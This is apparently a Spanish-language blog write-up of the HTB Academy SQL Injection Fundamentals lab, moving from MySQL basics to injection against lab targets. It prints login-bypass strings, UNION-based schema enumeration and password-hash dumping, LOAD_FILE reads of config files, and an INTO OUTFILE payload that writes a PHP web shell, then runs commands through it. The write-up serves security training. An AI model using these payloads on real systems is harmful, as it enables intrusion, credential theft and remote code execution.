---
layout: post
title: "Walkthrough: SQL Injections Fundamentals"
date:  24-02-2026
categories: [Walkthroughs, HTB Academy]
tags: [SQL, SQL Injections]
image: "assets/images/HTB_Academy_SQLi_Fundamentals/featured_image.png"
alt: portada de Walkthrough SQL Injections Fundamentals 
---
## MySQL

### Intro to MySQL

**Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?**

Authenticate to 94.237.58.134:42634 with user "root" and password "password"

Maquina objetivo: **`94.237.58.134:42634`**

En primer lugar compruebo la conexion a la maquina con el comando

```sh
ping -c2 94.237.58.134
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image.png)

Una vez confirmada la conectividad con la maquina realizo la conexion a la base de datos alojada en la maquina objetivo con las credenciales que me han suministrado **`root:password`**. Esto lo realizo con el comando mysql y los parametros adecuados para indicar el usuario **`-u`**, y el host destino **`-h`**, modificando el puerto por defecto al puerto que me indica el ejercicio con el parametro **`-P`**.

```sh
mysql -u root -h 94.237.58.134 -P 42634 -p
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-1.png)

Para mostrar las bases de datos alojadas en el servidor utilizo el comando siguiente:

```sql
show databases;
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-2.png)

He obtenido el nombre de la base de datos que me solicita el ejercicio.

### SQL Statements

**What is the department number for the 'Development' department?**

Authenticate to 94.237.58.134:42634 with user "root" and password "password"

Maquina objetivo: 94.237.58.134:42634

Una vez conectados al servidor de la base de datos en el ejercicio anterior puedo indicar la base de datos sobre la que quiero actuar con el siguiente comando:

```sql
use employees;
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-3.png)

Dentro de la base de datos puedo ver las tablas que existen creadas con el comando siguiente:

```sql
show tables;
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-4.png)

Para ver todos los departamentos creados en la tabla departments uso la siguiente sentencia de sql:

```sql
select * from departments;
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-5.png)

Obtengo el valor solicitado por el ejercicio.

### Query Results

**What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?**

Authenticate to 94.237.58.134:42634 with user "root" and password "password"

Maquina objetivo: 94.237.58.134:42634

Para conocer cual es el empleado cuyo nombre empieza por "Bar" y que fue contratado el "1990-01-01" uso una sentencia select sobre la tabla empleados adaptando la consulta con el comando where indicando que el primer nombre "es como" 'Bar%' donde el % actua de comodín y añado como segunda condicion la fecha de contratacion.

```sql
select * from employees where first_name LIKE 'Bar%' AND hire_date='1990-01-01';
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-6.png)

Obtengo el apellido del empleado buscado.

### SQL Operators

**In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?**

Authenticate to 94.237.58.134:42634 with user "root" and password "password"

Maquina objetivo: 94.237.58.134:42634

Realizo una consulta en la tabla titles para empleados cuyo emp_no es mayor a 10000 o el titulo no es como "%enginer%". Y añado un operador Count sobre el total para obtener el numero.

```sql
SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-7.png)


## SQL Injections

### Subverting Query Logic

**Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?**

94.237.50.194:45573

Conecto a la aplicacion web.

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-8.png)

Realizo la prueba usando el usuario tom y como clave pongo un **`'`**

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-10.png)

Obtengo la sentencia select que usa la aplicacion para realizar la consulta a la base de datos.

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-11.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-12.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-13.png)



### Using Comments

**Login as the user with the id 5 to get the flag.**

83.136.252.199:51420

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-14.png)

usando usuario: tom y password: pass

```sql
SELECT * FROM logins WHERE (username='tom' AND id > 1) AND password = '1a1dc91c907325c69271ddf0c944bc72';
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-15.png)

usare como usuario: `' OR id=5)--`

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-16.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-17.png)


### Union Clause

**Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.**

94.237.53.128:36723

Authenticate to 94.237.53.128:36723 with user "root" and password "password"

mysql -u root -h 94.237.53.128 -P 36723 -p

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-18.png)


![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-19.png)


![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-20.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-21.png)

select * from employees;

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-22.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-23.png)

SELECT emp_no,birth_date,first_name,last_name,gender,hire_date FROM employees UNION SELECT dept_no, dept_name,1,1,1,1 FROM departments--;

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-24.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-25.png)

### Union Injection

**Use a Union injection to get the result of 'user()'**

94.237.53.128:31996

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-26.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-27.png)

cn' UNION select 1,2,3-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-28.png)

cn' UNION select 1,2,3,4-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-29.png)

cn' UNION select 1,user(),3,4-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-30.png)

## Exploitation

### Database Enumeration

**What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?**    

94.237.53.128:39113




![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-31.png)

cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-32.png)

cn' UNION select 1,database(),2,3-- -


![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-33.png)


cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-34.png)

cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-35.png)

cn' UNION select 1, username, password, 4 from ilfreight.users-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-36.png)


### Reading Files

**We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.**



We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-37.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-38.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-39.png)

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-40.png)

### Writing Files

**Find the flag by using a webshell.**

94.237.54.116:55595

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-41.png)


cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-42.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-43.png)

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-44.png)

http://94.237.54.116:55595/shell.php?0=id

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-45.png)

http://94.237.54.116:55595/shell.php?0=ls

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-46.png)

http://94.237.54.116:55595/shell.php?0=ls /var/www/

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-47.png)

http://94.237.54.116:55595/shell.php?0=cat%20/var/www/flag.txt

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-48.png)

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-49.png)

## Skills Assessment - SQL Injection Fundamentals

**The company Inlanefreight has contracted you to perform a web application assessment against one of their public-facing websites. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.**

**They provided a target IP address and no further information about their website. Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.**

**Find the vulnerabilities and submit a final flag using the skills we covered to complete this module. Don't forget to think outside the box!**

**Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.**

Objetivo: 83.136.252.199:38757

En este desafío final, debo evaluar la aplicación web, explotar vulnerabilidades y encontrar una flag en el directorio raíz del sistema de archivos.

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-50.png)

Tras varios intentos uso la siguiente inyeccion de SQL para que la evaluacion de la sentencia de login salga true. 

```sql
admin' or '1'='1' #
pass
```

Uso la logica siguiente: `user=admin or 1=1 # and password=pass`. La almohadilla `#` hace que la parte de comprobacion de clave se convierta en un simple comentario. por lo que se evalua solamente `user=admin or 1=1` que intencionadamente tiene una evaluacion siempre `true` ya que 1=1.

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-53.png)

Con esto consigo pasar el login y acceder a la aplicacion web.

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-54.png)


Mediante el uso de UNION y aumentando el numero de columnas obtengo la capacidad de realizar consultas a la base de datos para obtener informacion de su esquema.

Comienzo con `'UNION SELECT 1-- -` que me da el siguiente resultado

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-55.png)

Coy aumentando el numero de columnas hasta que obtengo un resultado correcto que no me devuelve error.

```sql
'UNION SELECT 1,2,3,4,5-- -
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-56.png)

Uso esta estructura de cinco columnas para realizar consultas a la base de datos.

En primer lugar compruebo la capacidad de escritura de ficheros en el directorio de trabajo 

```sql
' union select 1,'testing file writting!',3,4,5 into outfile '/var/www/html/dashboard/test.txt'-- -
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-63.png)

Verifico que he creado el fichero test.txt

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-62.png)

De la misma forma creo un fichero shell.php que contendra una una Web Shell para inyectar comandos.

' union select "",'<?php system($_REQUEST[comando]); ?>', "", "", ""  into outfile '/var/www/html/dashboard/shell.php'-- -

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-64.png)

Compruebo que puedo inyectar comandos con `http://83.136.252.199:38757/dashboard/shell.php?comando=id` y obtengo:

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-65.png)

Por lo que es valido y realizo diferentes inyecciones explorando la maquina:

```sh
http://83.136.252.199:38757/dashboard/shell.php?comando=ls
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-66.png)

```sh
http://83.136.252.199:38757/dashboard/shell.php?comando=ls /
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-67.png)

He localizado el fichero de la flag `flag_cae1dadcd174.txt`. Mediante la injeccion del comando `cat /flag_cae1dadcd174.txt` obtengo la flag

```sh
http://83.136.252.199:38757/dashboard/shell.php?comando=cat%20/flag_cae1dadcd174.txt
```

![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-68.png)